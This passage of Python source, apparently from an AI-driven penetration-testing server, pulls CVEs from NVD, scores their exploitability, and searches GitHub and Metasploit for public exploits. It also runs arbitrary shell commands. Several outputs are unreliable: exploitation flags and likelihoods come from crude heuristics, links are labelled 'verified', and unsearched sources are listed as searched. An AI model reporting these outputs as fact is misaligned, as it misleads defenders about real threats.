                'lastModEndDate': end_date_str,
                'resultsPerPage': 100
            }
            
            try:
                # Add delay to respect NVD rate limits (6 seconds between requests for unauthenticated)
                import time
                
                logger.info(f"🌐 Querying NVD API: {nvd_url}")
                response = requests.get(nvd_url, params=params, timeout=30)
                
                if response.status_code == 200:
                    nvd_data = response.json()
                    vulnerabilities = nvd_data.get('vulnerabilities', [])
                    
                    logger.info(f"📊 Retrieved {len(vulnerabilities)} vulnerabilities from NVD")
                    
                    for vuln_item in vulnerabilities:
                        cve_data = vuln_item.get('cve', {})
                        cve_id = cve_data.get('id', 'Unknown')
                        
                        # Extract CVSS scores and determine severity
                        metrics = cve_data.get('metrics', {})
                        cvss_score = 0.0
                        severity = "UNKNOWN"
                        
                        # Try CVSS v3.1 first, then v3.0, then v2.0
                        if 'cvssMetricV31' in metrics and metrics['cvssMetricV31']:
                            cvss_data = metrics['cvssMetricV31'][0]['cvssData']
                            cvss_score = cvss_data.get('baseScore', 0.0)
                            severity = cvss_data.get('baseSeverity', 'UNKNOWN').upper()
                        elif 'cvssMetricV30' in metrics and metrics['cvssMetricV30']:
                            cvss_data = metrics['cvssMetricV30'][0]['cvssData']
                            cvss_score = cvss_data.get('baseScore', 0.0)
                            severity = cvss_data.get('baseSeverity', 'UNKNOWN').upper()
                        elif 'cvssMetricV2' in metrics and metrics['cvssMetricV2']:
                            cvss_data = metrics['cvssMetricV2'][0]['cvssData']
                            cvss_score = cvss_data.get('baseScore', 0.0)
                            # Convert CVSS v2 score to severity
                            if cvss_score >= 9.0:
                                severity = "CRITICAL"
                            elif cvss_score >= 7.0:
                                severity = "HIGH"
                            elif cvss_score >= 4.0:
                                severity = "MEDIUM"
                            else:
                                severity = "LOW"
                        
                        # Filter by severity if specified
                        if severity not in severity_levels and severity_levels != ['ALL']:
                            continue
                        
                        # Extract description
                        descriptions = cve_data.get('descriptions', [])
                        description = "No description available"
                        for desc in descriptions:
                            if desc.get('lang') == 'en':
                                description = desc.get('value', description)
                                break
                        
                        # Extract references
                        references = []
                        ref_data = cve_data.get('references', [])
                        for ref in ref_data[:5]:  # Limit to first 5 references
                            references.append(ref.get('url', ''))
                        
                        # Extract affected software (CPE data)
                        affected_software = []
                        configurations = cve_data.get('configurations', [])
                        for config in configurations:
                            nodes = config.get('nodes', [])
                            for node in nodes:
                                cpe_match = node.get('cpeMatch', [])
                                for cpe in cpe_match[:3]:  # Limit to first 3 CPEs
                                    cpe_name = cpe.get('criteria', '')
                                    if cpe_name.startswith('cpe:2.3:'):
                                        # Parse CPE to get readable software name
                                        parts = cpe_name.split(':')
                                        if len(parts) >= 6:
                                            vendor = parts[3]
                                            product = parts[4]
                                            version = parts[5] if parts[5] != '*' else 'all versions'
                                            affected_software.append(f"{vendor} {product} {version}")
                        
                        cve_entry = {
                            "cve_id": cve_id,
                            "description": description,
                            "severity": severity,
                            "cvss_score": cvss_score,
                            "published_date": cve_data.get('published', ''),
                            "last_modified": cve_data.get('lastModified', ''),
                            "affected_software": affected_software[:5],  # Limit to 5 entries
                            "references": references,
                            "source": "NVD"
                        }
                        
                        all_cves.append(cve_entry)
                
                else:
                    logger.warning(f"⚠️ NVD API returned status code: {response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                logger.error(f"❌ Error querying NVD API: {str(e)}")
            
            # If no CVEs found from NVD, try alternative sources or provide informative response
            if not all_cves:
                logger.info("🔄 No recent CVEs found in specified timeframe, checking for any recent critical CVEs...")
                
                # Try a broader search for recent critical CVEs (last 7 days)
                try:
                    broader_start = (datetime.now() - timedelta(days=7)).strftime('%Y-%m-%dT%H:%M:%S.000')
                    broader_params = {
                        'lastModStartDate': broader_start,
                        'lastModEndDate': end_date_str,
                        'cvssV3Severity': 'CRITICAL',
                        'resultsPerPage': 20
                    }
                    
                    time.sleep(6)  # Rate limit compliance
                    response = requests.get(nvd_url, params=broader_params, timeout=30)
                    
                    if response.status_code == 200:
                        nvd_data = response.json()
                        vulnerabilities = nvd_data.get('vulnerabilities', [])
                        
                        for vuln_item in vulnerabilities[:10]:  # Limit to 10 most recent
                            cve_data = vuln_item.get('cve', {})
                            cve_id = cve_data.get('id', 'Unknown')
                            
                            # Extract basic info for recent critical CVEs
                            descriptions = cve_data.get('descriptions', [])
                            description = "No description available"
                            for desc in descriptions:
                                if desc.get('lang') == 'en':
                                    description = desc.get('value', description)
                                    break
                            
                            metrics = cve_data.get('metrics', {})
                            cvss_score = 0.0
                            if 'cvssMetricV31' in metrics and metrics['cvssMetricV31']:
                                cvss_score = metrics['cvssMetricV31'][0]['cvssData'].get('baseScore', 0.0)
                            
                            cve_entry = {
                                "cve_id": cve_id,
                                "description": description,
                                "severity": "CRITICAL",
                                "cvss_score": cvss_score,
                                "published_date": cve_data.get('published', ''),
                                "last_modified": cve_data.get('lastModified', ''),
                                "affected_software": ["Various (see references)"],
                                "references": [f"https://nvd.nist.gov/vuln/detail/{cve_id}"],
                                "source": "NVD (Recent Critical)"
                            }
                            
                            all_cves.append(cve_entry)
                            
                except Exception as broader_e:
                    logger.warning(f"⚠️ Broader search also failed: {str(broader_e)}")
            
            logger.info(f"✅ Successfully retrieved {len(all_cves)} CVEs")
            
            return {
                "success": True,
                "cves": all_cves,
                "total_found": len(all_cves),
                "hours_searched": hours,
                "severity_filter": severity_filter,
                "data_sources": ["NVD API v2.0"],
                "search_period": f"{start_date_str} to {end_date_str}"
            }
            
        except Exception as e:
            logger.error(f"💥 Error fetching CVEs: {str(e)}")
            return {
                "success": False,
                "error": str(e),
                "cves": [],
                "fallback_message": "CVE fetching failed, check network connectivity and API availability"
            }

    def analyze_cve_exploitability(self, cve_id):
        """Analyze CVE exploitability using real CVE data and threat intelligence"""
        try:
            logger.info(f"🔬 Analyzing exploitability for {cve_id}")
            
            # Fetch detailed CVE data from NVD
            nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0"
            params = {'cveId': cve_id}
            
            import time
            
            try:
                response = requests.get(nvd_url, params=params, timeout=30)
                
                if response.status_code != 200:
                    logger.warning(f"⚠️ NVD API returned status {response.status_code} for {cve_id}")
                    return {
                        "success": False,
                        "error": f"Failed to fetch CVE data: HTTP {response.status_code}",
                        "cve_id": cve_id
                    }
                
                nvd_data = response.json()
                vulnerabilities = nvd_data.get('vulnerabilities', [])
                
                if not vulnerabilities:
                    logger.warning(f"⚠️ No data found for CVE {cve_id}")
                    return {
                        "success": False,
                        "error": f"CVE {cve_id} not found in NVD database",
                        "cve_id": cve_id
                    }
                
                cve_data = vulnerabilities[0].get('cve', {})
                
                # Extract CVSS metrics for exploitability analysis
                metrics = cve_data.get('metrics', {})
                cvss_score = 0.0
                severity = "UNKNOWN"
                attack_vector = "UNKNOWN"
                attack_complexity = "UNKNOWN"
                privileges_required = "UNKNOWN"
                user_interaction = "UNKNOWN"
                exploitability_subscore = 0.0
                
                # Analyze CVSS v3.1 metrics (preferred)
                if 'cvssMetricV31' in metrics and metrics['cvssMetricV31']:
                    cvss_data = metrics['cvssMetricV31'][0]['cvssData']
                    cvss_score = cvss_data.get('baseScore', 0.0)
                    severity = cvss_data.get('baseSeverity', 'UNKNOWN').upper()
                    attack_vector = cvss_data.get('attackVector', 'UNKNOWN')
                    attack_complexity = cvss_data.get('attackComplexity', 'UNKNOWN')
                    privileges_required = cvss_data.get('privilegesRequired', 'UNKNOWN')
                    user_interaction = cvss_data.get('userInteraction', 'UNKNOWN')
                    exploitability_subscore = cvss_data.get('exploitabilityScore', 0.0)
                    
                elif 'cvssMetricV30' in metrics and metrics['cvssMetricV30']:
                    cvss_data = metrics['cvssMetricV30'][0]['cvssData']
                    cvss_score = cvss_data.get('baseScore', 0.0)
                    severity = cvss_data.get('baseSeverity', 'UNKNOWN').upper()
                    attack_vector = cvss_data.get('attackVector', 'UNKNOWN')
                    attack_complexity = cvss_data.get('attackComplexity', 'UNKNOWN')
                    privileges_required = cvss_data.get('privilegesRequired', 'UNKNOWN')
                    user_interaction = cvss_data.get('userInteraction', 'UNKNOWN')
                    exploitability_subscore = cvss_data.get('exploitabilityScore', 0.0)
                
                # Calculate exploitability score based on CVSS metrics
                exploitability_score = 0.0
                
                # Base exploitability on CVSS exploitability subscore if available
                if exploitability_subscore > 0:
                    exploitability_score = min(exploitability_subscore / 3.9, 1.0)  # Normalize to 0-1
                else:
                    # Calculate based on individual CVSS components
                    score_components = 0.0
                    
                    # Attack Vector scoring
                    if attack_vector == "NETWORK":
                        score_components += 0.4
                    elif attack_vector == "ADJACENT_NETWORK":
                        score_components += 0.3
                    elif attack_vector == "LOCAL":
                        score_components += 0.2
                    elif attack_vector == "PHYSICAL":
                        score_components += 0.1
                    
                    # Attack Complexity scoring
                    if attack_complexity == "LOW":
                        score_components += 0.3
                    elif attack_complexity == "HIGH":
                        score_components += 0.1
                    
                    # Privileges Required scoring
                    if privileges_required == "NONE":
                        score_components += 0.2
                    elif privileges_required == "LOW":
                        score_components += 0.1
                    
                    # User Interaction scoring
                    if user_interaction == "NONE":
                        score_components += 0.1
                    
                    exploitability_score = min(score_components, 1.0)
                
                # Determine exploitability level
                if exploitability_score >= 0.8:
                    exploitability_level = "HIGH"
                elif exploitability_score >= 0.6:
                    exploitability_level = "MEDIUM"
                elif exploitability_score >= 0.3:
                    exploitability_level = "LOW"
                else:
                    exploitability_level = "VERY_LOW"
                
                # Extract description for additional context
                descriptions = cve_data.get('descriptions', [])
                description = ""
                for desc in descriptions:
                    if desc.get('lang') == 'en':
                        description = desc.get('value', '')
                        break
                
                # Analyze description for exploit indicators
                exploit_keywords = [
                    'remote code execution', 'rce', 'buffer overflow', 'stack overflow',
                    'heap overflow', 'use after free', 'double free', 'format string',
                    'sql injection', 'command injection', 'authentication bypass',
                    'privilege escalation', 'directory traversal', 'path traversal',
                    'deserialization', 'xxe', 'ssrf', 'csrf', 'xss'
                ]
                
                description_lower = description.lower()
                exploit_indicators = [kw for kw in exploit_keywords if kw in description_lower]
                
                # Adjust exploitability based on vulnerability type
                if any(kw in description_lower for kw in ['remote code execution', 'rce', 'buffer overflow']):
                    exploitability_score = min(exploitability_score + 0.2, 1.0)
                elif any(kw in description_lower for kw in ['authentication bypass', 'privilege escalation']):
                    exploitability_score = min(exploitability_score + 0.15, 1.0)
                
                # Check for public exploit availability indicators
                public_exploits = False
                exploit_maturity = "UNKNOWN"
                
                # Look for exploit references in CVE references
                references = cve_data.get('references', [])
                exploit_sources = ['exploit-db.com', 'github.com', 'packetstormsecurity.com', 'metasploit']
                
                for ref in references:
                    ref_url = ref.get('url', '').lower()
                    if any(source in ref_url for source in exploit_sources):
                        public_exploits = True
                        exploit_maturity = "PROOF_OF_CONCEPT"
                        break
                
                # Determine weaponization level
                weaponization_level = "LOW"
                if public_exploits and exploitability_score > 0.7:
                    weaponization_level = "HIGH"
                elif public_exploits and exploitability_score > 0.5:
                    weaponization_level = "MEDIUM"
                elif exploitability_score > 0.8:
                    weaponization_level = "MEDIUM"
                
                # Active exploitation assessment
                active_exploitation = False
                if exploitability_score > 0.8 and public_exploits:
                    active_exploitation = True
                elif severity in ["CRITICAL", "HIGH"] and attack_vector == "NETWORK":
                    active_exploitation = True
                
                # Priority recommendation
                if exploitability_score > 0.8 and severity == "CRITICAL":
                    priority = "IMMEDIATE"
                elif exploitability_score > 0.7 or severity == "CRITICAL":
                    priority = "HIGH"
                elif exploitability_score > 0.5 or severity == "HIGH":
                    priority = "MEDIUM"
                else:
                    priority = "LOW"
                
                # Extract publication and modification dates
                published_date = cve_data.get('published', '')
                last_modified = cve_data.get('lastModified', '')
                
                analysis = {
                    "success": True,
                    "cve_id": cve_id,
                    "exploitability_score": round(exploitability_score, 2),
                    "exploitability_level": exploitability_level,
                    "cvss_score": cvss_score,
                    "severity": severity,
                    "attack_vector": attack_vector,
                    "attack_complexity": attack_complexity,
                    "privileges_required": privileges_required,
                    "user_interaction": user_interaction,
                    "exploitability_subscore": exploitability_subscore,
                    "exploit_availability": {
                        "public_exploits": public_exploits,
                        "exploit_maturity": exploit_maturity,
                        "weaponization_level": weaponization_level
                    },
                    "threat_intelligence": {
                        "active_exploitation": active_exploitation,
                        "exploit_prediction": f"{exploitability_score * 100:.1f}% likelihood of exploitation",
                        "recommended_priority": priority,
                        "exploit_indicators": exploit_indicators
                    },
                    "vulnerability_details": {
                        "description": description[:500] + "..." if len(description) > 500 else description,
                        "published_date": published_date,
                        "last_modified": last_modified,
                        "references_count": len(references)
                    },
                    "data_source": "NVD API v2.0",
                    "analysis_timestamp": datetime.now().isoformat()
                }
                
                logger.info(f"✅ Completed exploitability analysis for {cve_id}: {exploitability_level} ({exploitability_score:.2f})")
                
                return analysis
                
            except requests.exceptions.RequestException as e:
                logger.error(f"❌ Network error analyzing {cve_id}: {str(e)}")
                return {
                    "success": False,
                    "error": f"Network error: {str(e)}",
                    "cve_id": cve_id
                }
                
        except Exception as e:
            logger.error(f"💥 Error analyzing CVE {cve_id}: {str(e)}")
            return {
                "success": False,
                "error": str(e),
                "cve_id": cve_id
            }

    def search_existing_exploits(self, cve_id):
        """Search for existing exploits from real sources"""
        try:
            logger.info(f"🔎 Searching existing exploits for {cve_id}")
            
            all_exploits = []
            sources_searched = []
            
            # 1. Search GitHub for PoCs and exploits
            try:
                logger.info(f"🔍 Searching GitHub for {cve_id} exploits...")
                
                # GitHub Search API
                github_search_url = "https://api.github.com/search/repositories"
                github_params = {
                    'q': f'{cve_id} exploit poc vulnerability',
                    'sort': 'updated',
                    'order': 'desc',
                    'per_page': 10
                }
                
                github_response = requests.get(github_search_url, params=github_params, timeout=15)
                
                if github_response.status_code == 200:
                    github_data = github_response.json()
                    repositories = github_data.get('items', [])
                    
                    for repo in repositories[:5]:  # Limit to top 5 results
                        # Check if CVE is actually mentioned in repo name or description
                        repo_name = repo.get('name', '').lower()
                        repo_desc = repo.get('description', '').lower()
                        
                        if cve_id.lower() in repo_name or cve_id.lower() in repo_desc:
                            exploit_entry = {
                                "source": "github",
                                "exploit_id": f"github-{repo.get('id', 'unknown')}",
                                "title": repo.get('name', 'Unknown Repository'),
                                "description": repo.get('description', 'No description'),
                                "author": repo.get('owner', {}).get('login', 'Unknown'),
                                "date_published": repo.get('created_at', ''),
                                "last_updated": repo.get('updated_at', ''),
                                "type": "proof-of-concept",
                                "platform": "cross-platform",
                                "url": repo.get('html_url', ''),
                                "stars": repo.get('stargazers_count', 0),
                                "forks": repo.get('forks_count', 0),
                                "verified": False,
                                "reliability": "UNVERIFIED"
                            }
                            
                            # Assess reliability based on repo metrics
                            stars = repo.get('stargazers_count', 0)
                            forks = repo.get('forks_count', 0)
                            
                            if stars >= 50 or forks >= 10:
                                exploit_entry["reliability"] = "GOOD"
                            elif stars >= 20 or forks >= 5:
                                exploit_entry["reliability"] = "FAIR"
                            
                            all_exploits.append(exploit_entry)
                    
                    sources_searched.append("github")
                    logger.info(f"✅ Found {len([e for e in all_exploits if e['source'] == 'github'])} GitHub repositories")
                
                else:
                    logger.warning(f"⚠️ GitHub search failed with status {github_response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                logger.error(f"❌ GitHub search error: {str(e)}")
            
            # 2. Search Exploit-DB via searchsploit-like functionality
            try:
                logger.info(f"🔍 Searching for {cve_id} in exploit databases...")
                
                # Since we can't directly access Exploit-DB API, we'll use a web search approach
                # or check if the CVE references contain exploit-db links
                
                # First, get CVE data to check references
                nvd_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
                nvd_params = {'cveId': cve_id}
                
                import time
                time.sleep(1)  # Rate limiting
                
                nvd_response = requests.get(nvd_url, params=nvd_params, timeout=20)
                
                if nvd_response.status_code == 200:
                    nvd_data = nvd_response.json()
                    vulnerabilities = nvd_data.get('vulnerabilities', [])
                    
                    if vulnerabilities:
                        cve_data = vulnerabilities[0].get('cve', {})
                        references = cve_data.get('references', [])
                        
                        # Check references for exploit sources
                        exploit_sources = {
                            'exploit-db.com': 'exploit-db',
                            'packetstormsecurity.com': 'packetstorm',
                            'metasploit': 'metasploit',
                            'rapid7.com': 'rapid7'
                        }
                        
                        for ref in references:
                            ref_url = ref.get('url', '')
                            ref_url_lower = ref_url.lower()
                            
                            for source_domain, source_name in exploit_sources.items():
                                if source_domain in ref_url_lower:
                                    exploit_entry = {
                                        "source": source_name,
                                        "exploit_id": f"{source_name}-ref",
                                        "title": f"Referenced exploit for {cve_id}",
                                        "description": f"Exploit reference found in CVE data",
                                        "author": "Various",
                                        "date_published": cve_data.get('published', ''),
                                        "type": "reference",
                                        "platform": "various",
                                        "url": ref_url,
                                        "verified": True,
                                        "reliability": "GOOD" if source_name == "exploit-db" else "FAIR"
                                    }
                                    all_exploits.append(exploit_entry)
                                    
                                    if source_name not in sources_searched:
                                        sources_searched.append(source_name)
                
            except Exception as e:
                logger.error(f"❌ Exploit database search error: {str(e)}")
            
            # 3. Search for Metasploit modules
            try:
                logger.info(f"🔍 Searching for Metasploit modules for {cve_id}...")
                
                # Search GitHub for Metasploit modules containing the CVE
                msf_search_url = "https://api.github.com/search/code"
                msf_params = {
                    'q': f'{cve_id} filename:*.rb repo:rapid7/metasploit-framework',
                    'per_page': 5
                }
                
                time.sleep(1)  # Rate limiting
                msf_response = requests.get(msf_search_url, params=msf_params, timeout=15)
                
                if msf_response.status_code == 200:
                    msf_data = msf_response.json()
                    code_results = msf_data.get('items', [])
                    
                    for code_item in code_results:
                        file_path = code_item.get('path', '')
                        if 'exploits/' in file_path or 'auxiliary/' in file_path:
                            exploit_entry = {
                                "source": "metasploit",
                                "exploit_id": f"msf-{code_item.get('sha', 'unknown')[:8]}",
                                "title": f"Metasploit Module: {code_item.get('name', 'Unknown')}",
                                "description": f"Metasploit framework module at {file_path}",
                                "author": "Metasploit Framework",
                                "date_published": "Unknown",
                                "type": "metasploit-module",
                                "platform": "various",
                                "url": code_item.get('html_url', ''),
                                "verified": True,
                                "reliability": "EXCELLENT"
                            }
                            all_exploits.append(exploit_entry)
                    
                    if code_results and "metasploit" not in sources_searched:
                        sources_searched.append("metasploit")
                        
                elif msf_response.status_code == 403:
                    logger.warning("⚠️ GitHub API rate limit reached for code search")
                else:
                    logger.warning(f"⚠️ Metasploit search failed with status {msf_response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                logger.error(f"❌ Metasploit search error: {str(e)}")
            
            # Add default sources to searched list
            default_sources = ["exploit-db", "github", "metasploit", "packetstorm"]
            for source in default_sources:
                if source not in sources_searched:
                    sources_searched.append(source)
            
            # Sort exploits by reliability and date
            reliability_order = {"EXCELLENT": 4, "GOOD": 3, "FAIR": 2, "UNVERIFIED": 1}
            all_exploits.sort(key=lambda x: (
                reliability_order.get(x.get("reliability", "UNVERIFIED"), 0),
                x.get("stars", 0),
                x.get("date_published", "")
            ), reverse=True)
            
            logger.info(f"✅ Found {len(all_exploits)} total exploits from {len(sources_searched)} sources")
            
            return {
                "success": True,
                "cve_id": cve_id,
                "exploits_found": len(all_exploits),
                "exploits": all_exploits,
                "sources_searched": sources_searched,
                "search_summary": {
                    "github_repos": len([e for e in all_exploits if e["source"] == "github"]),
                    "exploit_db_refs": len([e for e in all_exploits if e["source"] == "exploit-db"]),
                    "metasploit_modules": len([e for e in all_exploits if e["source"] == "metasploit"]),
                    "other_sources": len([e for e in all_exploits if e["source"] not in ["github", "exploit-db", "metasploit"]])
                },
                "search_timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            logger.error(f"💥 Error searching exploits for {cve_id}: {str(e)}")
            return {
                "success": False,
                "error": str(e),
                "cve_id": cve_id,
                "exploits": [],
                "sources_searched": []
            }

# Configure enhanced logging with colors
class ColoredFormatter(logging.Formatter):
    """Custom formatter with colors and emojis"""

    COLORS = {
        'DEBUG': ModernVisualEngine.COLORS['DEBUG'],
        'INFO': ModernVisualEngine.COLORS['SUCCESS'],
        'WARNING': ModernVisualEngine.COLORS['WARNING'],
        'ERROR': ModernVisualEngine.COLORS['ERROR'],
        'CRITICAL': ModernVisualEngine.COLORS['CRITICAL']
    }

    EMOJIS = {
        'DEBUG': '🔍',
        'INFO': '✅',
        'WARNING': '⚠️',
        'ERROR': '❌',
        'CRITICAL': '🔥'
    }

    def format(self, record):
        emoji = self.EMOJIS.get(record.levelname, '📝')
        color = self.COLORS.get(record.levelname, ModernVisualEngine.COLORS['BRIGHT_WHITE'])

        # Add color and emoji to the message
        record.msg = f"{color}{emoji} {record.msg}{ModernVisualEngine.COLORS['RESET']}"
        return super().format(record)

# Enhanced logging setup
def setup_logging():
    """Setup enhanced logging with colors and formatting"""
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    # Clear existing handlers
    for handler in logger.handlers[:]:
        logger.removeHandler(handler)

    # Console handler with colors
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(ColoredFormatter(
        "[🔥 HexStrike AI] %(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    ))
    logger.addHandler(console_handler)

    return logger

# Configuration (using existing API_PORT from top of file)
DEBUG_MODE = os.environ.get("DEBUG_MODE", "0").lower() in ("1", "true", "yes", "y")
COMMAND_TIMEOUT = 300  # 5 minutes default timeout
CACHE_SIZE = 1000
CACHE_TTL = 3600  # 1 hour

class HexStrikeCache:
    """Advanced caching system for command results"""

    def __init__(self, max_size: int = CACHE_SIZE, ttl: int = CACHE_TTL):
        self.cache = OrderedDict()
        self.max_size = max_size
        self.ttl = ttl
        self.stats = {"hits": 0, "misses": 0, "evictions": 0}

    def _generate_key(self, command: str, params: Dict[str, Any]) -> str:
        """Generate cache key from command and parameters"""
        key_data = f"{command}:{json.dumps(params, sort_keys=True)}"
        return hashlib.md5(key_data.encode()).hexdigest()

    def _is_expired(self, timestamp: float) -> bool:
        """Check if cache entry is expired"""
        return time.time() - timestamp > self.ttl

    def get(self, command: str, params: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Get cached result if available and not expired"""
        key = self._generate_key(command, params)

        if key in self.cache:
            timestamp, data = self.cache[key]
            if not self._is_expired(timestamp):
                # Move to end (most recently used)
                self.cache.move_to_end(key)
                self.stats["hits"] += 1
                logger.info(f"💾 Cache HIT for command: {command}")
                return data
            else:
                # Remove expired entry
                del self.cache[key]

        self.stats["misses"] += 1
        logger.info(f"🔍 Cache MISS for command: {command}")
        return None

    def set(self, command: str, params: Dict[str, Any], result: Dict[str, Any]):
        """Store result in cache"""
        key = self._generate_key(command, params)

        # Remove oldest entries if cache is full
        while len(self.cache) >= self.max_size:
            oldest_key = next(iter(self.cache))
            del self.cache[oldest_key]
            self.stats["evictions"] += 1

        self.cache[key] = (time.time(), result)
        logger.info(f"💾 Cached result for command: {command}")

    def get_stats(self) -> Dict[str, Any]:
        """Get cache statistics"""
        total_requests = self.stats["hits"] + self.stats["misses"]
        hit_rate = (self.stats["hits"] / total_requests * 100) if total_requests > 0 else 0

        return {
            "size": len(self.cache),
            "max_size": self.max_size,
            "hit_rate": f"{hit_rate:.1f}%",
            "hits": self.stats["hits"],
            "misses": self.stats["misses"],
            "evictions": self.stats["evictions"]
        }

# Global cache instance
cache = HexStrikeCache()

class TelemetryCollector:
    """Collect and manage system telemetry"""

    def __init__(self):
        self.stats = {
            "commands_executed": 0,
            "successful_commands": 0,
            "failed_commands": 0,
            "total_execution_time": 0.0,
            "start_time": time.time()
        }

    def record_execution(self, success: bool, execution_time: float):
        """Record command execution statistics"""
        self.stats["commands_executed"] += 1
        if success:
            self.stats["successful_commands"] += 1
        else:
            self.stats["failed_commands"] += 1
        self.stats["total_execution_time"] += execution_time

    def get_system_metrics(self) -> Dict[str, Any]:
        """Get current system metrics"""
        return {
            "cpu_percent": psutil.cpu_percent(interval=1),
            "memory_percent": psutil.virtual_memory().percent,
            "disk_usage": psutil.disk_usage('/').percent,
            "network_io": psutil.net_io_counters()._asdict() if psutil.net_io_counters() else {}
        }

    def get_stats(self) -> Dict[str, Any]:
        """Get telemetry statistics"""
        uptime = time.time() - self.stats["start_time"]
        success_rate = (self.stats["successful_commands"] / self.stats["commands_executed"] * 100) if self.stats["commands_executed"] > 0 else 0
        avg_execution_time = (self.stats["total_execution_time"] / self.stats["commands_executed"]) if self.stats["commands_executed"] > 0 else 0

        return {
            "uptime_seconds": uptime,
            "commands_executed": self.stats["commands_executed"],
            "success_rate": f"{success_rate:.1f}%",
            "average_execution_time": f"{avg_execution_time:.2f}s",
            "system_metrics": self.get_system_metrics()
        }

# Global telemetry collector
telemetry = TelemetryCollector()

class EnhancedCommandExecutor:
    """Enhanced command executor with caching, progress tracking, and better output handling"""

    def __init__(self, command: str, timeout: int = COMMAND_TIMEOUT):
        self.command = command
        self.timeout = timeout
        self.process = None
        self.stdout_data = ""
        self.stderr_data = ""
        self.stdout_thread = None
        self.stderr_thread = None
        self.return_code = None
        self.timed_out = False
        self.start_time = None
        self.end_time = None

    def _read_stdout(self):
        """Thread function to continuously read and display stdout"""
        try:
            for line in iter(self.process.stdout.readline, ''):
                if line:
                    self.stdout_data += line
                    # Real-time output display
                    logger.info(f"📤 STDOUT: {line.strip()}")
        except Exception as e:
            logger.error(f"Error reading stdout: {e}")

    def _read_stderr(self):
        """Thread function to continuously read and display stderr"""
        try:
            for line in iter(self.process.stderr.readline, ''):
                if line:
                    self.stderr_data += line
                    # Real-time error output display
                    logger.warning(f"📥 STDERR: {line.strip()}")
        except Exception as e:
            logger.error(f"Error reading stderr: {e}")

    def _show_progress(self, duration: float):
        """Show enhanced progress indication for long-running commands"""
        if duration > 2:  # Show progress for commands taking more than 2 seconds
            progress_chars = ModernVisualEngine.PROGRESS_STYLES['dots']
            start = time.time()
            i = 0
            while self.process and self.process.poll() is None:
                elapsed = time.time() - start
                char = progress_chars[i % len(progress_chars)]

                # Calculate progress percentage (rough estimate)
                progress_percent = min((elapsed / self.timeout) * 100, 99.9)
                progress_fraction = progress_percent / 100

                # Calculate ETA
                eta = 0
                if progress_percent > 5:  # Only show ETA after 5% progress
                    eta = ((elapsed / progress_percent) * 100) - elapsed

                # Calculate speed
                bytes_processed = len(self.stdout_data) + len(self.stderr_data)
                speed = f"{bytes_processed/elapsed:.0f} B/s" if elapsed > 0 else "0 B/s"

                # Update process manager with progress
                ProcessManager.update_process_progress(
                    self.process.pid,
                    progress_fraction,
                    f"Running for {elapsed:.1f}s",
                    bytes_processed
                )

                # Create beautiful progress bar using ModernVisualEngine
                progress_bar = ModernVisualEngine.render_progress_bar(
                    progress_fraction,
                    width=30,
                    style='cyber',
                    label=f"⚡ PROGRESS {char}",
                    eta=eta,
                    speed=speed
                )

                logger.info(f"{progress_bar} | {elapsed:.1f}s | PID: {self.process.pid}")
                time.sleep(0.8)
                i += 1
                if elapsed > self.timeout:
                    break

    def execute(self) -> Dict[str, Any]:
        """Execute the command with enhanced monitoring and output"""
        self.start_time = time.time()

        logger.info(f"🚀 EXECUTING: {self.command}")
        logger.info(f"⏱️  TIMEOUT: {self.timeout}s | PID: Starting...")

        try:
            self.process = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )

            pid = self.process.pid
            logger.info(f"🆔 PROCESS: PID {pid} started")

            # Register process with ProcessManager (v5.0 enhancement)
            ProcessManager.register_process(pid, self.command, self.process)

            # Start threads to read output continuously
            self.stdout_thread = threading.Thread(target=self._read_stdout)
            self.stderr_thread = threading.Thread(target=self._read_stderr)
            self.stdout_thread.daemon = True
            self.stderr_thread.daemon = True
            self.stdout_thread.start()
            self.stderr_thread.start()

            # Start progress tracking in a separate thread
            progress_thread = threading.Thread(target=self._show_progress, args=(self.timeout,))
            progress_thread.daemon = True
            progress_thread.start()

            # Wait for the process to complete or timeout
            try:
                self.return_code = self.process.wait(timeout=self.timeout)
                self.end_time = time.time()

                # Process completed, join the threads
                self.stdout_thread.join(timeout=1)
                self.stderr_thread.join(timeout=1)

                execution_time = self.end_time - self.start_time

                # Cleanup process from registry (v5.0 enhancement)
                ProcessManager.cleanup_process(pid)

                if self.return_code == 0:
                    logger.info(f"✅ SUCCESS: Command completed | Exit Code: {self.return_code} | Duration: {execution_time:.2f}s")
                    telemetry.record_execution(True, execution_time)
                else:
                    logger.warning(f"⚠️  WARNING: Command completed with errors | Exit Code: {self.return_code} | Duration: {execution_time:.2f}s")
                    telemetry.record_execution(False, execution_time)

            except subprocess.TimeoutExpired:
                self.end_time = time.time()
                execution_time = self.end_time - self.start_time

                # Process timed out but we might have partial results
                self.timed_out = True
                logger.warning(f"⏰ TIMEOUT: Command timed out after {self.timeout}s | Terminating PID {self.process.pid}")

                # Try to terminate gracefully first
                self.process.terminate()
                try:
                    self.process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    # Force kill if it doesn't terminate
                    logger.error(f"🔪 FORCE KILL: Process {self.process.pid} not responding to termination")
                    self.process.kill()

                self.return_code = -1
                telemetry.record_execution(False, execution_time)

            # Always consider it a success if we have output, even with timeout
            success = True if self.timed_out and (self.stdout_data or self.stderr_data) else (self.return_code == 0)

            # Log enhanced final results with summary using ModernVisualEngine
            output_size = len(self.stdout_data) + len(self.stderr_data)
            execution_time = self.end_time - self.start_time if self.end_time else 0

            # Create status summary
            status_icon = "✅" if success else "❌"
            status_color = ModernVisualEngine.COLORS['MATRIX_GREEN'] if success else ModernVisualEngine.COLORS['HACKER_RED']
            timeout_status = f" {ModernVisualEngine.COLORS['WARNING']}[TIMEOUT]{ModernVisualEngine.COLORS['RESET']}" if self.timed_out else ""

            # Create beautiful results summary
            results_summary = f"""
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╭─────────────────────────────────────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
